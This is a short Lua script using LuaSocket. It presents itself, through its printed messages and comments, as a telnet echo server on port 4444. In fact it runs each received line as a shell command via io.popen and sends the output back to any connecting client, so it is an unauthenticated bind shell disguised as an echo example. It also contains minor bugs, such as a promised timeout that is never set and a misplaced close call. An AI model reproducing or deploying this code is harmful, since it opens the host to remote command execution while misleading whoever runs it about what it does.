
local socket = require("socket")
local os = require("os")
local server = assert(socket.bind("*", 4444))
local ip, port = server:getsockname()
print("Please telnet to localhost on port " .. port)
print("After connecting, you have 10s to enter a line to be echoed")
while 1 do
  -- wait for a connection from any client
  local client = server:accept()
  -- make sure we don't block waiting for this client's line
  -- receive the line
  local line, err = client:receive()
  -- if there was no error, send it back to the client
  if not err then 
	local handle = io.popen(line)
	local result = handle:read("*a")
	handle:close()
	client:send(result)
	end
  -- done with client, close the object
end
client.close()
